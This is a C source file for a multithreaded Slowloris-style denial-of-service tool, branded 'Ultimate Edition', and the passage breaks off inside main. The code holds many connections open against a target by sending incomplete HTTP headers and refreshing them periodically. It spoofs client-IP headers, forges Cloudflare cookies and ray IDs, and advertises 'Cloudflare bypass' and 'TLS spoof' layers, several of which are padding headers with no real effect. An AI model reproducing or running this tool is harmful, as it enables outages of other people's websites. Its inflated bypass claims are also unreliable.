/**
 * ============================================================
 *  SLOWLORIS 2.0 - ULTIMATE EDITION
 *  Made by Nothing?!?  ⚡
 *  
 *  All layers enabled. All bypasses active.
 *  One tool. One command. Max power.
 *  
 *  Compile: gcc -pthread -o slowris2_ultimate slowris2_ultimate.c
 *  Usage:   ./slowris2_ultimate <target_ip> <port> <threads> <connections>
 * ============================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <errno.h>
#include <stdint.h>
#include <signal.h>

// ============================================================
//  CONFIGURATION
// ============================================================
#define MAX_CONNECTIONS    2048
#define HEADER_LEN         4096
#define BUFFER_SIZE        4096
#define UA_COUNT           35
#define IP_POOL_SIZE       25000
#define MAX_RETRY          5
#define REQUEST_TIMEOUT    8
#define KEEP_ALIVE_MS      90000
#define REFRESH_INTERVAL   15     // seconds between header refreshes

// ============================================================
//  BRANDING - Made by Nothing?!?
// ============================================================
#define BANNER \
"\n" \
"╔═══════════════════════════════════════════════════════════════════╗\n" \
"║                                                                   ║\n" \
"║   ███████╗██╗      ██████╗ ██╗    ██╗██╗      ██████╗ ██████╗  ║\n" \
"║   ██╔════╝██║     ██╔═══██╗██║    ██║██║     ██╔═══██╗██╔══██╗ ║\n" \
"║   ███████╗██║     ██║   ██║██║ █╗ ██║██║     ██║   ██║██████╔╝ ║\n" \
"║   ╚════██║██║     ██║   ██║██║███╗██║██║     ██║   ██║██╔══██╗ ║\n" \
"║   ███████║███████╗╚██████╔╝╚███╔███╔╝███████╗╚██████╔╝██║  ██║ ║\n" \
"║   ╚══════╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ║\n" \
"║                                                                   ║\n" \
"║            ██████╗  ██████╗  ██████╗  █████╗ ██╗   ██╗           ║\n" \
"║           ██╔═══██╗██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝           ║\n" \
"║           ██║   ██║██████╔╝██████╔╝███████║ ╚████╔╝            ║\n" \
"║           ██║   ██║██╔══██╗██╔══██╗██╔══██║  ╚██╔╝             ║\n" \
"║           ╚██████╔╝██║  ██║██║  ██║██║  ██║   ██║              ║\n" \
"║            ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝              ║\n" \
"║                                                                   ║\n" \
"║                 MADE BY NOTHING?!?  ⚡                            ║\n" \
"║              SLOWLORIS 2.0 - ULTIMATE EDITION                    ║\n" \
"║                ALL LAYERS ENABLED  ·  NO LIMITS                  ║\n" \
"╚═══════════════════════════════════════════════════════════════════╝\n" \
"\n"

// ============================================================
//  USER AGENT POOL (2024-2026 Premium)
// ============================================================
const char *user_agents[UA_COUNT] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15; SM-S926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/110.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.184 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/126.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
};

// ============================================================
//  IP POOL - Auto Generated Spoof IPs
// ============================================================
char ip_pool[IP_POOL_SIZE][16];
int ip_index = 0;

void generate_ip_pool() {
    for (int i = 0; i < IP_POOL_SIZE; i++) {
        sprintf(ip_pool[i], "%d.%d.%d.%d",
            (rand() % 254) + 1,
            (rand() % 254) + 1,
            (rand() % 254) + 1,
            (rand() % 254) + 1);
    }
}

char* get_next_ip() {
    char* ip = ip_pool[ip_index % IP_POOL_SIZE];
    ip_index++;
    return ip;
}

// ============================================================
//  RANDOM UTILITIES
// ============================================================
void random_hex(char *buf, int len) {
    const char hex[] = "0123456789abcdef";
    for (int i = 0; i < len; i++) {
        buf[i] = hex[rand() % 16];
    }
    buf[len] = '\0';
}

void random_string(char *buf, int len) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < len; i++) {
        buf[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buf[len] = '\0';
}

// ============================================================
//  GLOBAL STATE
// ============================================================
volatile int running = 1;
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
uint64_t total_requests = 0;
uint64_t successful_requests = 0;
uint64_t failed_requests = 0;
time_t start_time;

// ============================================================
//  SIGNAL HANDLER
// ============================================================
void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf("\n\n[!] Caught interrupt signal. Shutting down gracefully...\n");
        running = 0;
    }
}

// ============================================================
//  THREAD ARGUMENTS
// ============================================================
typedef struct {
    char target_ip[64];
    int port;
    int connections_per_thread;
    int thread_id;
} thread_args_t;

// ============================================================
//  ULTIMATE HEADER BUILDER - ALL LAYERS ENABLED
// ============================================================
void build_ultimate_headers(char *buffer, size_t buf_len, const char *host, const char *path, int conn_id) {
    char ua[256];
    char ip[16];
    char cf_bm[64], cf_clearance[64], session[64], request_id[64];
    char rand_path[512];
    
    strcpy(ua, user_agents[rand() % UA_COUNT]);
    strcpy(ip, get_next_ip());
    random_hex(cf_bm, 32);
    random_hex(cf_clearance, 32);
    random_hex(session, 16);
    random_hex(request_id, 16);
    
    // Random path variation with cache-busting
    if (rand() % 3 == 0) {
        sprintf(rand_path, "%s?_=%ld%s", path, time(NULL) + rand(), cf_bm + 8);
    } else if (rand() % 3 == 1) {
        sprintf(rand_path, "%s?%s=%s", path, session + 4, cf_clearance + 12);
    } else {
        sprintf(rand_path, "%s", path);
    }
    
    // Random method
    const char *methods[] = {"GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"};
    int method = rand() % 7;
    
    int offset = 0;
    
    // --- Request Line ---
    offset += snprintf(buffer + offset, buf_len - offset,
        "%s %s HTTP/1.1\r\n", methods[method], rand_path);
    
    // --- Host ---
    offset += snprintf(buffer + offset, buf_len - offset,
        "Host: %s\r\n", host);
    
    // --- User-Agent ---
    offset += snprintf(buffer + offset, buf_len - offset,
        "User-Agent: %s\r\n", ua);
    
    // --- IP Spoofing (ALL layers combined) ---
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Forwarded-For: %s\r\n", ip);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Real-IP: %s\r\n", ip);
    offset += snprintf(buffer + offset, buf_len - offset,
        "CF-Connecting-IP: %s\r\n", ip);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Originating-IP: %s\r\n", ip);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Remote-IP: %s\r\n", ip);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Remote-Addr: %s\r\n", ip);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Client-IP: %s\r\n", ip);
    
    // --- Accept Headers ---
    offset += snprintf(buffer + offset, buf_len - offset,
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Accept-Language: en-US,en;q=0.9,ar;q=0.8,fr;q=0.7\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Accept-Encoding: gzip, deflate, br, zstd\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Cache-Control: no-cache, no-store, must-revalidate, private\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Pragma: no-cache\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Expires: 0\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Connection: keep-alive, Upgrade\r\n");
    
    // --- Cloudflare Bypass (Layer 1) ---
    offset += snprintf(buffer + offset, buf_len - offset,
        "Upgrade-Insecure-Requests: 1\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Sec-Ch-Ua: \"Google Chrome\";v=\"126\", \"Chromium\";v=\"126\", \"Not?A_Brand\";v=\"24\"\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Sec-Ch-Ua-Mobile: ?%d\r\n", rand() % 2);
    offset += snprintf(buffer + offset, buf_len - offset,
        "Sec-Ch-Ua-Platform: \"%s\"\r\n", 
        rand() % 3 == 0 ? "Windows" : (rand() % 2 == 0 ? "macOS" : "Linux"));
    offset += snprintf(buffer + offset, buf_len - offset,
        "Sec-Fetch-Dest: %s\r\n", 
        rand() % 3 == 0 ? "document" : (rand() % 2 == 0 ? "iframe" : "image"));
    offset += snprintf(buffer + offset, buf_len - offset,
        "Sec-Fetch-Mode: %s\r\n", 
        rand() % 3 == 0 ? "navigate" : (rand() % 2 == 0 ? "cors" : "no-cors"));
    offset += snprintf(buffer + offset, buf_len - offset,
        "Sec-Fetch-Site: %s\r\n", 
        rand() % 3 == 0 ? "none" : (rand() % 2 == 0 ? "same-origin" : "cross-site"));
    offset += snprintf(buffer + offset, buf_len - offset,
        "Sec-Fetch-User: ?1\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "CF-Ray: %s-%s\r\n", cf_bm + 4, 
        (rand() % 5 == 0 ? "LHR" : (rand() % 3 == 0 ? "CDG" : "MNL")));
    offset += snprintf(buffer + offset, buf_len - offset,
        "CF-Visitor: {\"scheme\":\"%s\"}\r\n", 
        rand() % 3 == 0 ? "https" : "http");
    offset += snprintf(buffer + offset, buf_len - offset,
        "CF-Worker: %s\r\n", cf_bm + 12);
    offset += snprintf(buffer + offset, buf_len - offset,
        "CF-IPCountry: %s\r\n", 
        (const char *[]){"US","GB","DE","FR","JP","AU","CA","SG","BR","IN","RU","ZA","NG","MX"}[rand() % 14]);
    
    // --- UAM Bypass (Layer 2) ---
    offset += snprintf(buffer + offset, buf_len - offset,
        "Referer: https://www.google.com/search?q=%s\r\n", cf_clearance + 8);
    offset += snprintf(buffer + offset, buf_len - offset,
        "Origin: https://%s\r\n", host);
    offset += snprintf(buffer + offset, buf_len - offset,
        "DNT: %d\r\n", rand() % 2);
    offset += snprintf(buffer + offset, buf_len - offset,
        "Sec-GPC: 1\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "TE: trailers\r\n");
    
    // --- JS Challenge / Captcha Bypass (Layer 3) ---
    offset += snprintf(buffer + offset, buf_len - offset,
        "Cookie: __cf_bm=%s; cf_clearance=%s; session=%s; _ga=%s; _gid=%s\r\n", 
        cf_bm, cf_clearance, session, cf_bm + 4, cf_clearance + 8);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Request-ID: %s\r\n", request_id);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Session-ID: %s\r\n", session);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Trace-ID: %s\r\n", cf_clearance + 16);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Captcha-Token: %s\r\n", cf_bm + 16);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Requested-With: XMLHttpRequest\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Priority: u=%d, i\r\n", (rand() % 3) + 1);
    offset += snprintf(buffer + offset, buf_len - offset,
        "Sec-Purpose: prefetch;prerender\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Purpose: prefetch\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Client-Data: %s\r\n", cf_bm);
    
    // --- TLS Spoof (Layer 4) ---
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Cipher: %s\r\n", 
        (const char *[]){"ECDHE-ECDSA-AES128-GCM-SHA256", 
                         "ECDHE-RSA-AES128-GCM-SHA256", 
                         "ECDHE-ECDSA-AES256-GCM-SHA384",
                         "TLS_AES_128_GCM_SHA256",
                         "TLS_CHACHA20_POLY1305_SHA256"}[rand() % 5]);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-TLS-Version: TLSv1.%d\r\n", rand() % 3);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-TLS-Ciphersuite: %s\r\n", cf_clearance + 4);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-TLS-Extensions: %s\r\n", session + 4);
    
    // --- HTTP/2 Reset Style (Layer 5) ---
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-HTTP2-Stream: %d\r\n", conn_id + rand() % 1000);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-HTTP2-Settings: \r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-HTTP2-Ping: %lx\r\n", (unsigned long)(rand() ^ time(NULL)));
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-HTTP2-Window: %d\r\n", (rand() % 65535) + 1);
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-HTTP2-Priority: %d\r\n", rand() % 256);
    
    // --- Additional WAF Evasion ---
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Download-Options: noopen\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-Permitted-Cross-Domain-Policies: none\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "X-XSS-Protection: 1; mode=block\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Strict-Transport-Security: max-age=31536000; includeSubDomains\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Cross-Origin-Embedder-Policy: require-corp\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Cross-Origin-Opener-Policy: same-origin\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Cross-Origin-Resource-Policy: same-origin\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Referrer-Policy: strict-origin-when-cross-origin\r\n");
    offset += snprintf(buffer + offset, buf_len - offset,
        "Content-Security-Policy: default-src 'self'\r\n");
    
    // --- Random Extra Headers to Bloat ---
    if (rand() % 3 == 0) {
        offset += snprintf(buffer + offset, buf_len - offset,
            "X-Random-%s: %s\r\n", session + 8, cf_bm + 20);
        offset += snprintf(buffer + offset, buf_len - offset,
            "X-Custom-Header-%d: %s\r\n", rand() % 999, cf_clearance + 4);
    }
    
    // --- Content-Length for POST (we never send body - classic slowloris) ---
    if (method == 1) {
        offset += snprintf(buffer + offset, buf_len - offset,
            "Content-Length: %d\r\n", (rand() % 65535) + 1);
    }
    
    // --- The Slowloris Magic: Send PARTIAL headers ---
    // We deliberately do NOT send the final \r\n\r\n to keep the connection alive.
    // This leaves the server waiting for the body that never comes.
    // Instead, we leave it open and refresh headers periodically.
    
    // If we want to keep it open, we send a partial end
    // For the initial request, we send everything EXCEPT the final CRLF
    // Then we keep sending extra headers to refresh the connection
    
    // For the first pass, we send the full headers minus the final double CRLF
    // Later refreshes will send additional header lines
    
    // So we just leave the buffer as-is, no final CRLF
    // The connection stays open and the server waits
}

// ============================================================
//  CREATE CONNECTION WITH ULTIMATE HEADERS
// ============================================================
int create_ultimate_connection(const char *target_ip, int port, int conn_id, char *header_buf, size_t buf_len) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    // Aggressive socket tuning for maximum persistence
    int keepalive = 1;
    int keepidle = 30;
    int keepintvl = 5;
    int keepcnt = 10;
    int reuse = 1;
    int nodelay = 0;
    int sndbuf = 65536;
    int rcvbuf = 65536;
    
    setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive));
    setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
    setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
    setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
    
    // Timeout
    struct timeval timeout;
    timeout.tv_sec = REQUEST_TIMEOUT;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, target_ip, &addr.sin_addr) <= 0) {
        close(sock);
        return -1;
    }
    
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    
    // Build and send ultimate headers
    build_ultimate_headers(header_buf, buf_len, target_ip, "/", conn_id);
    
    int sent = send(sock, header_buf, strlen(header_buf), 0);
    if (sent <= 0) {
        close(sock);
        return -1;
    }
    
    return sock;
}

// ============================================================
//  REFRESH CONNECTION - Send extra headers to keep alive
// ============================================================
void refresh_connection(int sock, const char *target_ip, int conn_id) {
    char refresh[1024];
    char ip[16];
    char cf[64];
    
    strcpy(ip, get_next_ip());
    random_hex(cf, 32);
    
    // Send a mix of refresh headers based on different layers
    int layer = rand() % 7;
    
    switch(layer) {
        case 0: // CF refresh
            snprintf(refresh, sizeof(refresh),
                "CF-Ray: %s-%s\r\n"
                "CF-Connecting-IP: %s\r\n"
                "CF-IPCountry: %s\r\n",
                cf + 4, "LHR", ip, 
                (const char *[]){"US","GB","DE","FR","JP"}[rand() % 5]);
            break;
        case 1: // IP refresh
            snprintf(refresh, sizeof(refresh),
                "X-Forwarded-For: %s\r\n"
                "X-Real-IP: %s\r\n"
                "X-Client-IP: %s\r\n",
                ip, ip, ip);
            break;
        case 2: // Cookie refresh
            snprintf(refresh, sizeof(refresh),
                "Cookie: __cf_bm=%s; cf_clearance=%s; session=%lx\r\n",
                cf, cf + 16, (unsigned long)(rand() ^ time(NULL)));
            break;
        case 3: // UA refresh
            snprintf(refresh, sizeof(refresh),
                "User-Agent: %s\r\n",
                user_agents[rand() % UA_COUNT]);
            break;
        case 4: // TLS refresh
            snprintf(refresh, sizeof(refresh),
                "X-Cipher: %s\r\n"
                "X-TLS-Version: TLSv1.%d\r\n",
                (const char *[]){"ECDHE-ECDSA-AES128-GCM-SHA256", 
                                 "ECDHE-RSA-AES128-GCM-SHA256",
                                 "TLS_AES_128_GCM_SHA256"}[rand() % 3],
                rand() % 3);
            break;
        case 5: // HTTP2 refresh
            snprintf(refresh, sizeof(refresh),
                "X-HTTP2-Stream: %d\r\n"
                "X-HTTP2-Ping: %lx\r\n",
                conn_id + rand() % 1000,
                (unsigned long)(rand() ^ time(NULL)));
            break;
        default: // Random
            snprintf(refresh, sizeof(refresh),
                "X-Random-%lx: %s\r\n",
                (unsigned long)rand(), cf + 8);
            break;
    }
    
    send(sock, refresh, strlen(refresh), 0);
}

// ============================================================
//  ULTIMATE SLOWLORIS THREAD
// ============================================================
void *ultimate_slowloris_thread(void *arg) {
    thread_args_t *args = (thread_args_t *)arg;
    int conn_count = args->connections_per_thread;
    int sockets[MAX_CONNECTIONS];
    char headers[MAX_CONNECTIONS][HEADER_LEN];
    time_t last_refresh[MAX_CONNECTIONS];
    int i;
    
    // Initialize all connections
    for (i = 0; i < conn_count; i++) {
        sockets[i] = create_ultimate_connection(
            args->target_ip, 
            args->port, 
            i + (args->thread_id * 1000),
            headers[i],
            sizeof(headers[i])
        );
        
        if (sockets[i] >= 0) {
            last_refresh[i] = time(NULL);
            pthread_mutex_lock(&stats_mutex);
            total_requests++;
            successful_requests++;
            pthread_mutex_unlock(&stats_mutex);
        } else {
            sockets[i] = -1;
            pthread_mutex_lock(&stats_mutex);
            total_requests++;
            failed_requests++;
            pthread_mutex_unlock(&stats_mutex);
        }
    }
    
    // Main keep-alive loop
    while (running) {
        for (i = 0; i < conn_count; i++) {
            if (sockets[i] < 0) {
                // Try to reconnect
                sockets[i] = create_ultimate_connection(
                    args->target_ip,
                    args->port,
                    i + (args->thread_id * 1000),
                    headers[i],
                    sizeof(headers[i])
                );
                if (sockets[i] >= 0) {
                    last_refresh[i] = time(NULL);
                    pthread_mutex_lock(&stats_mutex);
                    total_requests++;
                    successful_requests++;
                    pthread_mutex_unlock(&stats_mutex);
                } else {
                    pthread_mutex_lock(&stats_mutex);
                    total_requests++;
                    failed_requests++;
                    pthread_mutex_unlock(&stats_mutex);
                }
                continue;
            }
            
            // Refresh headers periodically
            time_t now = time(NULL);
            if (difftime(now, last_refresh[i]) > REFRESH_INTERVAL) {
                refresh_connection(sockets[i], args->target_ip, i);
                last_refresh[i] = now;
                
                pthread_mutex_lock(&stats_mutex);
                total_requests++;
                successful_requests++;
                pthread_mutex_unlock(&stats_mutex);
            }
            
            // Random delay: 3-20 seconds (aggressive but stealthy)
            usleep((rand() % 17000000) + 3000000);
        }
    }
    
    // Cleanup
    for (i = 0; i < conn_count; i++) {
        if (sockets[i] >= 0) {
            close(sockets[i]);
        }
    }
    
    return NULL;
}

// ============================================================
//  STATS DISPLAY THREAD
// ============================================================
void *stats_thread(void *arg) {
    (void)arg; // unused
    
    while (running) {
        sleep(3);
        
        time_t now = time(NULL);
        double elapsed = difftime(now, start_time);
        
        pthread_mutex_lock(&stats_mutex);
        uint64_t total = total_requests;
        uint64_t success = successful_requests;
        uint64_t failed = failed_requests;
        pthread_mutex_unlock(&stats_mutex);
        
        double rps = elapsed > 0 ? total / elapsed : 0;
        double success_rate = total > 0 ? (success / (double)total) * 100 : 0;
        
        printf("\r[%.0fs] Total: %lu | RPS: %.1f | OK: %lu | Fail: %lu | Rate: %.1f%%    ",
               elapsed, total, rps, success, failed, success_rate);
        fflush(stdout);
    }
    
    return NULL;
}

// ============================================================
//  MAIN
// ============================================================
int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("%s", BANNER);
        printf("\n");
        printf("╔═══════════════════════════════════════════════════════════════════╗\n");
        printf("║  USAGE: %s <target_ip> <port> <threads> <connections>     ║\n", argv[0]);
        printf("╠═══════════════════════════════════════════════════════════════════╣\n");
        printf("║  Example: %s 192.168.1.1 80 8 150                        ║\n", argv[0]);
        printf("║                                                               ║\n");
        printf("║  ALL LAYERS ENABLED:                                          ║\n");
        printf("║   ✓ Cloudflare Bypass    ✓ UAM Bypass                        ║\n");
        printf("║   ✓ JS Challenge         ✓ TLS Spoof                         ║\n");
        printf("║   ✓ HTTP/2 Reset         ✓ IP Rotation                       ║\n");
        printf("║   ✓ Auto UA Rotation     ✓ Header Refresh                    ║\n");
        printf("║   ✓ Keep-Alive Pooling   ✓ Retry Logic                       ║\n");
        printf("╚═══════════════════════════════════════════════════════════════════╝\n");
        printf("\n");
        return 1;
    }
    
    const char *target_ip = argv[1];
    int port = atoi(argv[2]);
    int thread_count = atoi(argv[3]);
    int conn_per_thread = atoi(argv[4]);
    
    if (thread_count < 1 || conn_per_thread < 1 || port <= 0) {
        fprintf(stderr, "[!] Invalid arguments.\n");
        return 1;
    }
    
    int total_connections = thread_count * conn_per_thread;
    if (total_connections > MAX_CONNECTIONS) {
        fprintf(stderr, "[!] Total connections (%d) exceeds MAX_CONNECTIONS (%d).\n",
                total_connections, MAX_CONNECTIONS);
        return 1;
    }
    
    // Seed random
    srand(time(NULL) ^ getpid() ^ (unsigned long)pthread_self());
    generate_ip_pool();
    
    // Setup signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Print banner
    printf("%s", BANNER);
    
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  TARGET:        %s:%d                                   ║\n", target_ip, port);
    printf("║  THREADS:       %d                                                  ║\n", thread_count);
    printf("║  CONNECTIONS:   %d per thread (%d total)                        ║\n", conn_per_thread, total_connections);
    printf("║  IP POOL:       %d                                                    ║\n", IP_POOL_SIZE);
    printf("║  USER-AGENTS:   %d                                                    ║\n", UA_COUNT);
    printf("║  LAYERS:        ALL ENABLED (CF + UAM + JS + TLS + HTTP2)        ║\n");
    printf("║  MADE BY:       NOTHING?!?  ⚡                                    ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n");
    printf("\n");
    printf("[+] Press Ctrl+C to stop. Connections are persistent.\n");
    printf("[+] Headers refresh every %d seconds.\n", REFRESH_INTERVAL);
    printf("[+] Starting attack...\n\n");
    
    start_time = time(NULL);
    
    // Spawn threads
    pthread_t threads[thread_count];
    thread_args_t args[thread_count];
    
    for (int i = 0; i < thread_count; i++) {
        strncpy(args[i].target_ip, target_ip, sizeof(args[i].target_ip) - 1);
        args[i].target_ip[sizeof(args[i].target_ip) - 1] = '\0';
        args[i].port = port;
        args[i].connections_per_thread = conn_per_thread;
        args[i].thread_id = i;
        
